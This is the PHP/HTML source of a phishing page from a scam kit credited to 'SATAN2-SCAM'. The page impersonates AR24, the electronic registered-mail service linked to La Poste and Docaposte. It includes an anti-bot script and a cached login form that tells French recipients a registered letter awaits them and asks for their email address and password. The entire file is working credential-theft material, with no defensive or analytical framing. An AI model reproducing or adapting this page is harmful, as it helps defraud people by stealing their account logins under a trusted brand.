 <?php

/**
 * @link     : https://www.lesatan2scam.com/ 
 * @package  : AR24-LAPOSTE
 * @author   : SATAN2-SCAM 
 * @telegram : @lesatan2scam
 * @couriel  : lesatan2scam@gmail.com
 * @version  : Mise à jour
 * @copyright: https://facebook.com/lesatan2scam
 */

include '../main/antibots.php';
include '../main/main.php';

$random   = rand(0,100000000000);
$ARL = substr(md5($random), 0, 17);

?>
<?php 
/*CACHE*/
$fichierCache = '../cache/login.arl';
if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
?>

<!DOCTYPE html>
<html lang="fr"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_yh1fOV"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<meta http-equiv="x-ua-compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Accuser réception du courrier 42250321 - AR24</title><link rel="icon" type="image/png" href="../assets/img/favicon.png">
<link rel="stylesheet" href="../assets/css/style.css?4874ytr">


<style>.pwd-input {-webkit-text-security: disc;-moz-text-security: disc;text-security: disc;}</style><style>
@keyframes slide-in-one-tap {
  from {
transform: translateY(80px);
  }
  to {
transform: translateY(0px);
  }
}

.trust-hide-gracefully {
  opacity: 0;
}

.trust-wallet-one-tap .hidden {
display: none;
  }

.trust-wallet-one-tap .semibold {
font-weight: 500;
  }

.trust-wallet-one-tap .binance-plex {
font-family: 'Binance';
  }

.trust-wallet-one-tap .rounded-full {
border-radius: 50%;
  }

.trust-wallet-one-tap .flex {
display: flex;
  }

.trust-wallet-one-tap .flex-col {
flex-direction: column;
  }

.trust-wallet-one-tap .items-center {
align-items: center;
  }

.trust-wallet-one-tap .space-between {
justify-content: space-between;
  }

.trust-wallet-one-tap .justify-center {
justify-content: center;
  }

.trust-wallet-one-tap .w-full {
width: 100%;
  }

.trust-wallet-one-tap .box {
transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
width: 384px;
border-radius: 15px;
background: #FFF;
box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
position: fixed;
right: 30px;
bottom: 30px;
z-index: 1020;
  }

.trust-wallet-one-tap .header {
gap: 15px;
border-bottom: 1px solid #E6E6E6;
padding: 10px 18px;
  }

.trust-wallet-one-tap .header .left-items {
  gap: 15px
}

.trust-wallet-one-tap .header .title {
  color: #1E2329;
  font-size: 18px;
  font-weight: 600;
  line-height: 28px;
}

.trust-wallet-one-tap .header .subtitle {
  color: #474D57;
  font-size: 14px;
  line-height: 20px;
}

.trust-wallet-one-tap .header .close {
  color: #1E2329;
  cursor: pointer;
}

.trust-wallet-one-tap .body {
padding: 9px 18px;
gap: 10px;

  }

.trust-wallet-one-tap .body .right-items {
  gap: 10px;
  width: 100%;
}

.trust-wallet-one-tap .body .right-items .wallet-title {
color: #1E2329;
font-size: 16px;
font-weight: 600;
line-height: 20px;
  }

.trust-wallet-one-tap .body .right-items .wallet-subtitle {
color: #474D57;
font-size: 14px;
line-height: 20px;
  }

.trust-wallet-one-tap .connect-indicator {
gap: 15px;
padding: 8px 0;
  }

.trust-wallet-one-tap .connect-indicator .flow-icon {
  color: #474D57;
}

.trust-wallet-one-tap .loading-color {
color: #FFF;
  }

.trust-wallet-one-tap .button {
border-radius: 50px;
outline: 2px solid transparent;
outline-offset: 2px;
background-color: rgb(5, 0, 255);
border-color: rgb(229, 231, 235);
cursor: pointer;
text-align: center;
height: 45px;
  }

.trust-wallet-one-tap .button .button-text {
  color: #FFF;
  font-size: 16px;
  font-weight: 600;
  line-height: 20px;
}

.trust-wallet-one-tap .footer {
margin: 20px 30px;
  }

.trust-wallet-one-tap .check-icon {
color: #FFF;
  }

@font-face {
  font-family: 'Binance';
  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
  font-weight: 400;
  font-style: normal;
}

@font-face {
  font-family: 'Binance';
  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
  font-weight: 500;
  font-style: normal;
}

@font-face {
  font-family: 'Binance';
  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
  font-weight: 600;
  font-style: normal;
}

</style></head><body class="guest"><noscript><div style="z-index:100;text-align:center;line-height:2em;background-color:#c0392b;color:#fff;font-weight:500;position:fixed;top:40px;left:50%;transform:translateX(-50%);padding:20px 30px">JavaScript n'est pas activé pour le site d'AR24. Il est nécessaire au bon fonctionnement de nos services.<br><a href="#" style="color:inherit;border-bottom:1px solid">Suivre les instructions pour activer JavaScript</a></div></noscript>
  
  <header id="header"><div class="wrapper"><a href="#" class="header-logo">AR24 - Lettre Recommandée Électronique</a> <button id="open-mobile-menu" class="btn btn-ghost small">Menu</button><nav aria-label="Main Navigation"><button id="close-mobile-menu" class="btn btn-ghost small">✖</button><ul><li><a href="#" id="btn_free_try" class="btn btn-primary small fw-500">Inscription</a></li><li><a href="#" class="btn small fw-500">Se connecter</a></li></ul></nav></div></header><main id="main-content">

  
<header><h1 class="align-center">Réceptionnez votre courrier recommandé électronique</h1>

</header><section class="content"><form id="arm-form" method="post" action="#"><input type="hidden" name="csrf_token" value="MTcyODIxNjE3NzI1MjM5YjZlN2UzYjhiZGQ0MjNlNDU5NWUzZDAxYjU0ODcxOGZhYTByXxZ1qOnmOgP+qXWfuOk6JoO5lvGZEgxxLuVBaq36TQ=="><p class="align-center"><strong>Bienvenue sur AR24 !</strong><br>Votre expéditeur cherche à vous faire parvenir un courrier recommandé de façon électronique. Il/elle a choisi notre service pour vous le faire parvenir.<br><a href="#" target="_self" class="btn-link">En savoir plus sur AR24</a></p>
 
  <div class="card mt-xl mb-xl"><p class="fw-500 mb-xl">Pour consulter et télécharger le document, veuillez vous connecter en saisissant l’adresse e-mail et le mot de passe du compte sur lequel ce message a été reçu. Sans cette authentification, l’accès au fichier ne pourra pas être autorisé.</p><div class="mail"><img loading="lazy" src="../assets/img/mail.png" width="150px"></div><label for="ide_id" class="fw-500">Adresse e-mail</label>
<input type="email" id="ide_id" name="ide" placeholder="Ex : monadresse@email.fr" required="" autocomplete="new-password">
<label for="pwd_id" class="fw-500">Mot de passe</label><div class="input-container"><input class="pwd-input password" type="text" id="pwd_id" name="pwd" autocomplete="new-password" placeholder="Votre mot de passe" required="">
<i id="visibilityBtn">
<span id="icon" onclick="togglePasswordVisibility()">

<svg id="view1" loading="lazy" class="toggle-password" width="24" height="24" viewBox="0 0 17 12" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block;">
<path d="M8.5 3.33333C7.02724 3.33333 5.83333 4.52724 5.83333 6C5.83333 7.47276 7.02724 8.66667 8.5 8.66667C9.97276 8.66667 11.1667 7.47276 11.1667 6C11.1667 4.52724 9.97276 3.33333 8.5 3.33333ZM7.16667 6C7.16667 5.26362 7.76362 4.66667 8.5 4.66667C9.23638 4.66667 9.83333 5.26362 9.83333 6C9.83333 6.73638 9.23638 7.33333 8.5 7.33333C7.76362 7.33333 7.16667 6.73638 7.16667 6Z" fill="#00008C"/>
<path d="M8.5 0C6.268 0 4.44634 1.11594 3.12845 2.34596C1.81017 3.57636 0.932341 4.97794 0.570382 5.70186C0.476539 5.88954 0.476539 6.11046 0.570382 6.29814C0.932341 7.02206 1.81017 8.42364 3.12845 9.65404C4.44634 10.8841 6.268 12 8.5 12C10.732 12 12.5537 10.8841 13.8715 9.65404C15.1898 8.42364 16.0677 7.02206 16.4296 6.29814C16.5235 6.11046 16.5235 5.88954 16.4296 5.70186C16.0677 4.97794 15.1898 3.57636 13.8715 2.34596C12.5537 1.11594 10.732 0 8.5 0ZM4.03821 8.6793C3.02491 7.73355 2.30049 6.66857 1.92247 6C2.30049 5.33142 3.02491 4.26645 4.03821 3.3207C5.22033 2.2174 6.732 1.33333 8.5 1.33333C10.268 1.33333 11.7797 2.2174 12.9618 3.3207C13.9751 4.26645 14.6995 5.33142 15.0775 6C14.6995 6.66857 13.9751 7.73355 12.9618 8.6793C11.7797 9.78261 10.268 10.6667 8.5 10.6667C6.732 10.6667 5.22033 9.78261 4.03821 8.6793Z" fill="#00008C"/>
</svg>

<svg id="view2" loading="lazy" class="toggle-password"  width="24" height="24" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: none;">
<path d="M1.63807 0.195262C1.37772 -0.0650874 0.955612 -0.0650874 0.695262 0.195262C0.434913 0.455612 0.434913 0.877722 0.695262 1.13807L3.53906 3.98187C1.98549 5.29413 0.964089 6.91479 0.570382 7.70221C0.476539 7.88989 0.476539 8.11081 0.570382 8.29849C0.932341 9.02241 1.81017 10.424 3.12845 11.6544C4.44634 12.8844 6.268 14.0003 8.5 14.0003C9.63437 14.0003 10.7334 13.6261 11.5208 13.2762C11.871 13.1206 12.17 12.965 12.3961 12.8389L15.3619 15.8047C15.6223 16.0651 16.0444 16.0651 16.3047 15.8047C16.5651 15.5444 16.5651 15.1223 16.3047 14.8619L1.63807 0.195262ZM1.92246 8.00033C2.35681 7.23209 3.24133 5.95395 4.48568 4.92849L6.20262 6.64543C5.96798 7.04247 5.83333 7.50561 5.83333 8.0002C5.83333 9.47296 7.02724 10.6669 8.5 10.6669C8.99459 10.6669 9.45774 10.5322 9.85477 10.2976L11.4103 11.8531C11.2799 11.919 11.1354 11.9884 10.9792 12.0578C10.2666 12.3746 9.36563 12.667 8.5 12.667C6.732 12.667 5.22033 11.783 4.03821 10.6796C3.0249 9.73389 2.30047 8.66891 1.92246 8.00033ZM8.84552 9.28833C8.73532 9.31782 8.6195 9.33354 8.5 9.33354C7.76362 9.33354 7.16667 8.73658 7.16667 8.0002C7.16667 7.8807 7.18239 7.76488 7.21187 7.65468L8.84552 9.28833Z" fill="#00008C"/>
<path d="M7.31446 3.46705C7.69412 3.38082 8.08939 3.33333 8.50015 3.33333C10.2676 3.33333 11.7792 4.21737 12.9613 5.3207C13.9767 6.26846 14.702 7.33589 15.079 8.00401C14.8209 8.48076 14.5733 8.84609 14.3829 9.09986C14.2685 9.25227 14.1749 9.36423 14.1123 9.43571C14.0654 9.4893 14.0359 9.52007 14.0282 9.52796L14.0264 9.52986C13.7675 9.79013 13.7677 10.211 14.0273 10.471C14.2874 10.7316 14.7095 10.7319 14.9701 10.4718L15.1153 10.3143C15.1987 10.2191 15.3136 10.0811 15.4494 9.90014C15.7208 9.53838 16.0762 9.00432 16.4289 8.29776C16.5225 8.11025 16.5225 7.88964 16.4288 7.70215C16.0672 6.97796 15.1893 5.57634 13.8711 4.34597C12.5532 3.11597 10.7316 2 8.50015 2C7.98569 2 7.49138 2.05957 7.01916 2.16682C6.66011 2.24837 6.43516 2.60554 6.5167 2.96459C6.59825 3.32363 6.95542 3.54859 7.31446 3.46705Z" fill="#00008C"/>
</svg>

</span>
</i>
</div><div class="display-flex mt-m"><input type="checkbox" id="remember-me" name="persistent" value="1">
<label for="remember-me">Se souvenir de moi</label></div><p class="align-center mt-m"><input class="btn btn-primary sero" type="button" value="Connexion" title="Connexion" aria-label="Se connecter"></p></div></form></section></main><footer id="footer"><div class="wrapper"><div class="top"><div class="logo"><img loading="lazy" src="../assets/img/AR24.png"></div><div class="line">Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.<br>AR24 est une filiale de Docaposte</div><div class="imgs"><img loading="lazy" src="../assets/img/frenchtech.png" width="61px" height="65px" walt="French Tech">
<img loading="lazy" src="../assets/img/regionalsace_grey.png" width="54px" height="63px" alt="Région Alsace">
<img loading="lazy" src="../assets/img/syntec.png" width="80px" height="31px" alt="Syntec Numérique" class="syntec"></div></div><hr><div class="bottom"><div class="col col-contact"><span class="phone secondary-color">08 11 69 05 45<br><span class="time">(0.05€/min + prix appel)</span></span><br><span class="time">Du lundi au vendredi</span><br><span class="time">de 9h00 à 17h30 en continu</span><br></div><div class="col"><ul><li><a href="#">Se connecter</a></li><li><a href="#">Accueil</a></li><li><a href="#">Qui sommes-nous ?</a></li><li><a href="#">Avantages</a></li><li><a href="#" class="ccb__edit">Paramètres des cookies</a></li><li><a href="#">Certifications</a></li><li><a href="#">Contact</a></li></ul></div><div class="col"><ul><li><a href="#">Pour qui ?</a></li><li><a href="#">FAQ</a></li><li><a href="#">Base de connaissances</a></li><li><a href="#">Vérifier mes preuves</a></li><li><a href="#">Vérifier un email</a></li></ul></div><div class="col"><ul><li><a href="#">CGU</a></li><li><a href="#">Mentions légales</a></li><li><a href="#" style="white-space:nowrap">Politique de confidentialité : inscription</a></li><li><a href="#">Sous-traitants ultérieurs</a></li><li><a href="#" target="_self">Etat du service</a></li></ul></div><div class="col col-copyright"><ul><li><a href="#"><img loading="lazy" src="data:image/svg+xml,%3csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;24&#39; height=&#39;24&#39; fill=&#39;none&#39;%3e%3cpath fill=&#39;%23fff&#39; fill-rule=&#39;evenodd&#39; d=&#39;M16.667 5.501a8 8 0 1 0 0 12.997z&#39; clip-rule=&#39;evenodd&#39;/%3e%3cpath fill=&#39;%23002395&#39; fill-rule=&#39;evenodd&#39; d=&#39;M8.333 5A8 8 0 0 0 4 12.112a8 8 0 0 0 4.333 7.112z&#39; clip-rule=&#39;evenodd&#39;/%3e%3cpath fill=&#39;%23ED2939&#39; fill-rule=&#39;evenodd&#39; d=&#39;M16 19.224a8 8 0 0 0 4.333-7.112A8 8 0 0 0 16 5z&#39; clip-rule=&#39;evenodd&#39;/%3e%3cpath fill=&#39;%2300008C&#39; stroke=&#39;%2300008C&#39; stroke-linecap=&#39;round&#39; d=&#39;M6.275 6.274v.001A8.09 8.09 0 0 0 3.903 12c0 2.235.909 4.26 2.37 5.722A8.07 8.07 0 0 0 12 20.092c2.235 0 4.26-.904 5.722-2.37A8.06 8.06 0 0 0 20.092 12c0-2.235-.905-4.26-2.37-5.725A8.07 8.07 0 0 0 12 3.904c-2.235 0-4.26.909-5.725 2.37ZM18.01 18.008h-.001A8.46 8.46 0 0 1 12 20.5a8.47 8.47 0 0 1-6.012-2.492A8.48 8.48 0 0 1 3.5 12c0-2.348.951-4.471 2.488-6.012A8.48 8.48 0 0 1 12 3.5c2.345 0 4.472.951 6.008 2.488A8.47 8.47 0 0 1 20.5 12a8.46 8.46 0 0 1-2.491 6.008Z&#39;/%3e%3c/svg%3e" style="height:2.5rem" alt=""></a></li><li><a href="#"><img loading="lazy" src="data:image/svg+xml,%3csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;24&#39; height=&#39;24&#39; fill=&#39;none&#39;%3e%3cg clip-path=&#39;url%28%23a%29&#39;%3e%3cellipse cx=&#39;12.006&#39; cy=&#39;11.987&#39; fill=&#39;%23fff&#39; rx=&#39;9.006&#39; ry=&#39;8.987&#39;/%3e%3cpath fill=&#39;%2329337A&#39; d=&#39;M4.585 6.9a9 9 0 0 0-1.29 2.805H7.39zM9.48 3.36a9 9 0 0 0-2.843 1.413L9.48 7.616zM6.848 19.377c.793.555 1.68.985 2.631 1.262v-3.893zM3.4 14.657a9 9 0 0 0 1.336 2.654l2.653-2.654z&#39;/%3e%3cpath fill=&#39;%23fff&#39; d=&#39;M4.733 6.691q-.075.104-.148.21L7.39 9.704H3.296q-.098.38-.165.771h5.387zM6.639 19.23q.103.075.208.148l2.632-2.632v3.894q.38.11.77.188v-5.21zM3.2 13.887q.082.391.199.77h3.99l-2.654 2.654q.435.593.957 1.107l4.53-4.531zM9.479 3.36v4.255L6.636 4.772a9 9 0 0 0-1.098.966l4.711 4.711V3.171a9 9 0 0 0-.77.189&#39;/%3e%3cpath fill=&#39;%23E51D35&#39; d=&#39;m9.48 14.63-.028.027h.027zM10.223 13.887h.027v-.028zM13.686 10.476h-.026v.026zM9.506 9.705 9.48 9.68v.026zM10.25 10.45v.026h.027z&#39;/%3e%3cpath fill=&#39;%2329337A&#39; d=&#39;M14.432 18.647v2.018a9 9 0 0 0 2.668-1.25l-2.186-2.186c-.175.613-.239.93-.482 1.418M14.925 7.122l2.387-2.387a9 9 0 0 0-2.88-1.4v2.072c.28.562.304.99.493 1.715M19.228 17.363a9 9 0 0 0 1.373-2.706h-4.08zM20.704 9.705a9 9 0 0 0-1.326-2.857L16.52 9.705z&#39;/%3e%3cpath fill=&#39;%23E51D35&#39; d=&#39;M12 21&#39;/%3e%3cpath fill=&#39;%2329337A&#39; d=&#39;M14.432 19.037c.243-.488.452-1.05.627-1.663l-.627-.627zM15.137 6.91a10 10 0 0 0-.705-1.946v2.651z&#39;/%3e%3cpath fill=&#39;%23fff&#39; d=&#39;M15.625 14.214q.015-.163.028-.327h-.355zM14.431 7.615V4.964a5 5 0 0 0-.77-1.156v4.936l1.547-1.548q-.035-.144-.072-.285zM13.687 10.476h1.992a22 22 0 0 0-.188-1.804zM13.66 20.192c.287-.31.544-.701.771-1.156v-2.29l.627.627c.144-.504.264-1.042.362-1.606l-1.76-1.76z&#39;/%3e%3cpath fill=&#39;%23E51D35&#39; d=&#39;m15.225 8.938 3.218-3.219a9 9 0 0 0-.929-.83l-2.528 2.53c.112.47.163 1.008.239 1.519M12 21c.568 0 1.122-.055 1.66-.156v-1.036C13.189 20.32 12.636 21 12 21M20.869 10.476h-5.408a24 24 0 0 1-.026 3.41H20.8a9 9 0 0 0 .069-3.41M15.45 14.04c-.05.53-.224.945-.31 1.447l3.046 3.047q.453-.43.843-.916zM13.66 4.152v-.997A9 9 0 0 0 12 3c.635 0 1.188.64 1.66 1.152&#39;/%3e%3cpath fill=&#39;%23E51D35&#39; d=&#39;M13.66 20.193v-6.185l1.76 1.76c.087-.502.155-1.023.205-1.554l-.327-.327h.355c.089-1.122.098-2.282.026-3.41h-1.992l1.804-1.805a17 17 0 0 0-.282-1.476L13.66 8.744V3.807C13.188 3.295 12.635 3 12 3q-.225 0-.45.011a9 9 0 0 0-1.3.16v7.279L5.54 5.738q-.436.449-.805.953l3.785 3.785H3.13a9.048 9.048 0 0 0 .068 3.41h7.024l-4.53 4.532q.444.438.946.81l3.611-3.61v5.21A9 9 0 0 0 12 21c.635 0 1.188-.295 1.66-.807&#39;/%3e%3c/g%3e%3cpath fill=&#39;%2300008C&#39; stroke=&#39;%2300008C&#39; stroke-linecap=&#39;round&#39; d=&#39;M6.275 6.274v.001A8.09 8.09 0 0 0 3.903 12c0 2.235.909 4.26 2.37 5.722A8.07 8.07 0 0 0 12 20.092c2.235 0 4.26-.904 5.722-2.37A8.06 8.06 0 0 0 20.092 12c0-2.235-.905-4.26-2.37-5.725A8.07 8.07 0 0 0 12 3.904c-2.235 0-4.26.909-5.725 2.37ZM18.01 18.008h-.001A8.46 8.46 0 0 1 12 20.5a8.47 8.47 0 0 1-6.012-2.492A8.48 8.48 0 0 1 3.5 12c0-2.348.951-4.471 2.488-6.012A8.48 8.48 0 0 1 12 3.5c2.345 0 4.472.951 6.008 2.488A8.47 8.47 0 0 1 20.5 12a8.46 8.46 0 0 1-2.491 6.008Z&#39;/%3e%3cdefs%3e%3cclipPath id=&#39;a&#39;%3e%3cpath fill=&#39;%23fff&#39; d=&#39;M3 3h18v18H3z&#39;/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e" style="height:2.5rem" alt=""></a></li><li><a href="#"><img loading="lazy" src="data:image/svg+xml,%3csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;25&#39; height=&#39;24&#39; fill=&#39;none&#39;%3e%3cg clip-path=&#39;url%28%23a%29&#39;%3e%3ccircle cx=&#39;13&#39; cy=&#39;12&#39; r=&#39;8&#39; fill=&#39;%23fff&#39;/%3e%3cpath fill=&#39;%2321468B&#39; d=&#39;M12.5 20c-5.2 0-7.5-3.733-8-5.4H20c-.5 1.667-2.7 5.4-7.5 5.4&#39;/%3e%3cpath fill=&#39;%23AE1C28&#39; d=&#39;M12.5 4C7.3 4 5 7.556 4.5 9.333h16C19.917 7.556 17.5 4 12.5 4&#39;/%3e%3c/g%3e%3cpath fill=&#39;%2300008C&#39; stroke=&#39;%2300008C&#39; stroke-linecap=&#39;round&#39; d=&#39;M6.775 6.274v.001A8.09 8.09 0 0 0 4.403 12c0 2.235.909 4.26 2.37 5.722a8.07 8.07 0 0 0 5.726 2.37c2.235 0 4.26-.904 5.722-2.37A8.06 8.06 0 0 0 20.592 12c0-2.235-.905-4.26-2.37-5.725A8.07 8.07 0 0 0 12.5 3.904c-2.235 0-4.26.909-5.725 2.37ZM18.51 18.008h-.001A8.46 8.46 0 0 1 12.5 20.5a8.47 8.47 0 0 1-6.012-2.492A8.48 8.48 0 0 1 4 12c0-2.348.951-4.471 2.488-6.012A8.48 8.48 0 0 1 12.5 3.5c2.345 0 4.472.951 6.008 2.488A8.47 8.47 0 0 1 21 12a8.46 8.46 0 0 1-2.491 6.008Z&#39;/%3e%3cdefs%3e%3cclipPath id=&#39;a&#39;%3e%3cpath fill=&#39;%23fff&#39; d=&#39;M0 4h25v16H0z&#39;/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e" style="height:2.5rem" alt=""></a></li></ul><br><p class="copyright">Tous droits réservés<br>AR24 <?php echo date('Y'); ?></p></div></div></div></footer>
  
  
  
  <style>#cconsent-bar,#cconsent-bar *{box-sizing:border-box;font-family:Rubik,sans-serif}#cconsent-bar{background-color:rgba(34,34,34,.7);color:#fff;padding:15px;text-align:right;font-family:sans-serif;font-size:14px;line-height:18px;position:fixed;bottom:0;left:0;width:100%;z-index:9998;transform:translateY(0);transition:transform .6s ease-in-out;transition-delay:.3s}#cconsent-bar.ccb--hidden{transform:translateY(100%);display:block}#cconsent-bar .ccb__wrapper{display:flex;flex-wrap:no-wrap;justify-content:space-between;max-width:1800px;margin:0 auto}@media(max-width:750px){#cconsent-bar .ccb__wrapper{flex-direction:column}}#cconsent-bar .ccb__left{align-self:center;text-align:left;margin:15px 0}#cconsent-bar .ccb__left .cc-text{font-size:.95em;text-align:justify}#cconsent-bar .ccb__right{align-self:center;white-space:nowrap}#cconsent-bar .ccb__right>div{display:inline-block;color:#fff;padding:15px}#cconsent-bar .ccb__right .ccb__button{display:flex;flex-direction:row;align-items:center;justify-content:center}#cconsent-bar .ccb__right .ccb__edit{display:none}#cconsent-bar a{text-decoration:underline;color:#fff}#cconsent-bar button{line-height:normal;font-size:14px;border:none;border-radius:.35em;font-weight:500;padding:10px 1.5em;color:#fff;background-color:#3498db}#cconsent-bar button+button{margin-left:1.5em}#cconsent-bar div.consent-close-and-refuse{font-weight:600;color:#888;cursor:pointer;font-size:26px;position:absolute;right:15px;top:15px}#cconsent-bar a.ccb__edit{margin-right:15px}#cconsent-bar a:hover,#cconsent-bar button:hover{cursor:pointer}#cconsent-modal{font-family:Rubik,sans-serif;display:none;font-size:14px;line-height:18px;color:#666;width:100vw;height:100vh;position:fixed;left:0;top:0;right:0;bottom:0;font-family:sans-serif;font-size:14px;background-color:rgba(0,0,0,.6);z-index:9999;align-items:center;justify-content:center}@media(max-width:600px){#cconsent-modal{height:100%}}#cconsent-modal h2,#cconsent-modal h3{color:#333}#cconsent-modal.ccm--visible{display:flex}#cconsent-modal .ccm__content{max-width:800px;min-height:500px;max-height:600px;overflow-y:auto;background-color:#efefef}@media(max-width:600px){#cconsent-modal .ccm__content{max-width:100vw;height:100%;max-height:initial}}#cconsent-modal .ccm__content>.ccm__content__heading{border-bottom:1px solid #d8d8d8;padding:35px 35px 20px;background-color:#efefef;position:relative}#cconsent-modal .ccm__content>.ccm__content__heading h2{font-size:21px;font-weight:600;color:#333;margin:0 0 16px}#cconsent-modal .ccm__content>.ccm__content__heading p a{display:block;margin-top:12px}#cconsent-modal .ccm__content>.ccm__content__heading .ccm__cheading__close{font-weight:600;color:#888;cursor:pointer;font-size:26px;position:absolute;right:15px;top:15px}#cconsent-modal h2,#cconsent-modal h3{margin-top:0}#cconsent-modal .ccm__content>.ccm__content__body{background-color:#fff}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup{margin:0;border-bottom:1px solid #d8d8d8}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup .ccm__tab-head .ccm__tab-head__icon-wedge{transition:transform .3s ease-out;transform-origin:16px 6px 0;position:absolute;right:25px;top:50%;transform:rotate(0);transform:translateY(-50%)}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup .ccm__tab-head .ccm__tab-head__icon-wedge>svg{pointer-events:none}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-head .ccm__tab-head__icon-wedge{transform:rotate(-180deg)}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-head{color:#333;padding:17px 35px;margin:0}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content{padding:25px 35px;margin:0}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-head{transition:background-color .5s ease-out}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-head:hover{background-color:#f9f9f9}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-head{font-weight:600;cursor:pointer;position:relative}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup .ccm__tab-content{display:none}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-head{background-color:#f9f9f9}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-content{display:flex}@media(max-width:600px){#cconsent-modal .ccm__content>.ccm__content__body .ccm__tabgroup.ccm__tabgroup--open .ccm__tab-content{flex-direction:column}}@media(max-width:600px){#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left{margin-bottom:20px}}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch-component{display:flex;margin-right:35px;align-items:center}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch-component>div{font-weight:600}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch-group{width:40px;height:20px;margin:0 10px;position:relative}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch{position:absolute;top:0;right:0;display:inline-block;width:40px;height:20px}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input{display:none}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch .ccm__switch__slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;border-radius:10px;-webkit-transition:.4s;transition:.4s}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch .ccm__switch__slider:before{position:absolute;content:"";height:12px;width:12px;left:4px;bottom:4px;background-color:#fff;border-radius:50%;-webkit-transition:.4s;transition:.4s}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input:checked+.ccm__switch__slider{background-color:#28a834}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input:focus+.ccm__switch__slider{box-shadow:0 0 1px #28A834}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__tab-content__left .ccm__switch input:checked+.ccm__switch__slider:before{-webkit-transform:translateX(20px);-ms-transform:translateX(20px);transform:translateX(20px)}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content h3{font-size:18px;margin-bottom:10px;line-height:1}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content p{color:#444;margin-bottom:0}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__list:not(:empty){margin-top:30px}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__list .ccm__list__title{color:#333;font-weight:600}#cconsent-modal .ccm__content>.ccm__content__body .ccm__tab-content .ccm__list ul{margin:15px 0;padding-left:15px}#cconsent-modal .ccm__footer{padding:35px;background-color:#efefef;text-align:center;display:flex;align-items:center;justify-content:flex-end}#cconsent-modal .ccm__footer button{border-radius:.35em;line-height:normal;font-size:14px;transition:background-color .5s ease-out;background-color:#f5bf1c;color:#222;border:none;padding:13px;min-width:110px;border-radius:2px;cursor:pointer}#cconsent-modal .ccm__footer button:hover{background-color:#e1ab08}#cconsent-modal .ccm__footer button#ccm__footer__consent-modal-submit{margin-right:10px;margin-left:10px}</style><div id="cconsent-bar" class="ccb--hidden"><div class="ccb__wrapper"><div class="ccb__left"><div class="cc-text"><h5>AR24 respecte votre vie privée</h5>Afin de vous offrir la meilleure expérience sur notre site, et de réaliser des statistiques de visite, nous utilisons des cookies. Ils nous permettent notamment de personnaliser notre contenu, et de vous proposer des partages sur les réseaux sociaux. La confidentialité et la sécurité de vos données utilisateur sont la priorité de nos services. C'est pourquoi vous pouvez choisir de <a class="ccb__edit" style="margin-right:0">paramétrer vos cookies</a>.
Nous souhaitons également vous expliquer de manière transparente pourquoi nous collectons des cookies. Pour cela, vous avez la possibilité de consulter notre <a href="#">politique de cookies</a>. L'objectif pour AR24 est de vous fournir en tant qu'utilisateur, des informations claires et accessibles sur les cookies et leurs rôles sur notre site.</div></div><div class="ccb__right"><div class="ccb__button"><a class="ccb__edit">Paramètres</a><button class="consent-refuse">Refuser</button><button class="consent-give">Accepter</button></div></div><div class="consent-close-and-refuse consent-refuse">×</div></div></div><div id="cconsent-modal"><div class="ccm__content"><div class="ccm__content__heading"><h2>Paramètres des cookies</h2><p>Des cookies nécessaires au bon fonctionnement de ce site web sont utilisés et ne nécessitent pas de consentement préalable. Ces cookies sont configurés en réponse aux actions que vous faites sur notre site internet, et contribuent à rendre notre site web 